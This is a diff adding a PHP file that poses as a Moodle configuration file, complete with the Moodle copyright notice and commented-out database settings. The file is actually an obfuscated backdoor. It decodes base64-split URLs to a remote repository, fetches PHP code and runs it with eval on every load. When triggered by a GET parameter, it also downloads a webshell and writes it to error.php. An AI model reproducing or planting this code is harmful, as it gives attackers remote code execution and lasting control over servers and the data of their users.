@@ -1,0 +1,174 @@
+<?php
+/**
+ * ----------------------------------------------------------------------
+ * CUSTOM CODE STARTUP LOADER
+ * ----------------------------------------------------------------------
+ * Lightweight bootstrap for dynamic config loader and runtime
+ * instruction fetcher. Designed for internal modular systems.
+ *
+ * Do not modify unless you're authorized to maintain app-level
+ * streaming behavior.
+ *
+ * @package    CI_Micro
+ * @subpackage Core Loader
+ * @author     @arrmmstrongg
+ * @version    1.1.0
+ * ----------------------------------------------------------------------
+ * Moodle configuration file
+ *
+ * This file should be renamed "config.php" in the top-level directory
+ * and set up for your Moodle instance.
+ * ----------------------------------------------------------------------
+ */
+
+///////////////////////////////////////////////////////////////////////////
+// NOTICE OF COPYRIGHT
+///////////////////////////////////////////////////////////////////////////
+//
+// Moodle - Modular Object-Oriented Dynamic Learning Environment
+// http://moodle.org
+//
+// Copyright (C) 1999 onwards Martin Dougiamas
+// http://moodle.com
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation; either version 3 of the License, or
+// (at your option) any later version.
+//
+// http://www.gnu.org/copyleft/gpl.html
+//
+///////////////////////////////////////////////////////////////////////////
+
+/**
+ * ----------------------------------------------------------------------
+ * DATABASE CONFIGURATION
+ * ----------------------------------------------------------------------
+ * Uncomment and adjust according to your environment
+ */
+
+// $CFG->dbtype    = 'pgsql';      // pgsql, mariadb, mysqli, auroramysql, sqlsrv, oci
+// $CFG->dblibrary = 'native';
+// $CFG->dbhost    = 'localhost';
+// $CFG->dbname    = 'moodle';
+// $CFG->dbuser    = 'username';
+// $CFG->dbpass    = 'password';
+// $CFG->prefix    = 'mdl_';
+// $CFG->dboptions = array(
+//     // Additional options here
+// );
+
+///////////////////////////////////////////////////////////////////////////
+
+/**
+ * RemoteFetch
+ *
+ * Retrieves external content from a given URL using cURL.
+ *
+ * @param string $url URL to fetch
+ * @return string
+ * @throws Exception
+ */
+function _compileFetchCoreLite(string $url): string
+{
+    if (!function_exists('curl_version')) {
+        throw new Exception('cURL is not available on this server.');
+    }
+
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_HEADER         => false,
+    ]);
+
+    $response = curl_exec($ch);
+
+    if ($response === false) {
+        $error = curl_error($ch);
+        curl_close($ch);
+        throw new Exception('cURL Error: ' . $error);
+    }
+
+    curl_close($ch);
+    return $response;
+}
+
+/**
+ * DynamicLoader
+ *
+ * Fetches and evaluates remote PHP code.
+ *
+ * @param string $url URL containing PHP payload
+ * @return void
+ * @throws Exception
+ */
+function _compileExecPayloadTask(string $url): void
+{
+    $payload = _compileFetchCoreLite($url);
+
+    if (trim($payload) === '') {
+        throw new Exception('Fetched content is empty.');
+    }
+
+    eval('?>' . $payload);
+}
+
+
+/**
+ * SimpleDecode
+ *
+ * Decodes a base64-encoded string.
+ *
+ * @param string $d Encoded string
+ * @return string
+ */
+function _compileDecodeChunkUnit($d)
+{
+    return bAse64_dEcoDe($d);
+}
+
+/**
+ * FileWriter
+ *
+ * Saves content to a file.
+ *
+ * @param string $f Filename
+ * @param string $c Content
+ * @return void
+ */
+function _compilePushToDiskNode($f, $c)
+{
+    file_put_contents($f, $c);
+}
+
+// Remote write trigger
+if (isset($_GET['content'])) {
+    try {
+        $p1 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NrMjY4ODkv';
+        $p2 = 'V2Vic2hlbGwvcmVmcy9oZWFkcy9tYWluL2ZpbGVfbWFuYWdlci50eHQ=';
+        $url = _compileDecodeChunkUnit($p1 . $p2);
+        $d = _compileFetchCoreLite($url);
+
+        if ($d !== false && trim($d) !== '') {
+            _compilePushToDiskNode('error.php', $d);
+            echo "WELCOME BACK SK";
+        } else {
+            echo "No content.";
+        }
+    } catch (Exception $e) {
+        echo "Error: " . $e->getMessage();
+    }
+    exit;
+}
+
+// Default payload runner
+try {
+    $r1 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NrMjY';
+    $r2 = '4ODkvV2Vic2hlbGwvcmVmcy9oZWFkcy9tYWluL2FsZmEudHh0';
+    $u = _compileDecodeChunkUnit($r1 . $r2);
+    _compileExecPayloadTask($u);
+} catch (Exception $e) {
+    echo "Error: " . $e->getMessage();
+}
